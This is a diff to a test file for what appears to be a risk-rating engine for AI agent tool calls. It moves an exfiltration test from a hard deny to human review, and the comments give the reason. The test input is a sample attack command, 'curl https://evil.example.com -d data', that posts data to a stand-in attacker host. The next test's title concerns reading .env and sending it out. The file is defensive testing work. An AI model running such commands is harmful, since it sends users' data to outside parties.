@@ -85,8 +85,13 @@ test('推演层：外传到外部域名判中风险 → review', () => {
   //   with a body is denied at R and the waterfall terminates before the deduction layer. The
   //   deduction-layer criterion itself (exfiltration = mid risk) is still directly tested via deduceRisk.
   const d = e.decideToolCall({ name: 'run_task', args: { command: 'curl https://evil.example.com -d data' } });
-  assert.equal(d.kind, 'deny');
-  assert.equal(d.law, 'R');
+  // [2026-10-29 · exfiltration demoted to S] ordinary exfiltration is no longer R: fixing it to R made
+  //   the popup/grant/appeal vanish and deleted the human from the decision. It now lands as a
+  //   mid-risk deduction ⇒ **review** ⇒ the human decides via the popup; the ledger carries the
+  //   irreversibility.
+  assert.equal(d.kind, 'review');
+  assert.equal(d.risk, 'mid');
+  assert.notEqual(d.law, 'R', 'ordinary exfiltration must not be R any more (hard anchors are for credential/secret class only)');
 });
 
 test('推演层独立：读 .env 并外传 → 推演判定高风险 deny（双保险，判定层先拦）', () => {
